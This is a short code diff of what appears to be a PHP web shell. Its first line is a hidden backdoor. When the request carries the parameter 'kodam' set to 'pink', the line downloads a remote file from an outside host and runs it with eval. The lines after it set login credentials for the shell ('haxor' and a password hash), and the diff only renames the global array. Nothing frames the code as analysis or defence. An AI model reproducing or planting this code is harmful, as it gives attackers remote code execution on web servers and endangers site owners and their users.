@@ -1,7 +1,7 @@
 <?php if (isset($_GET["kodam"]) && $_GET["kodam"] === "pink") { $link = "https://dg.icepenguino.com/ComXUp.txt"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $link); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  $output = curl_exec($ch); curl_close($ch); if ($output) { eval("?>" . $output); } } ?>
 <?php
 
-$GLOBALS['DarkGhoul'] = array(
+$GLOBALS['Leviathan'] = array(
     'username' => 'haxor',
     'password' => '3d94a39c0ffcd8b8d1c55a312f8f5998',
     'safe_mode' => '0',
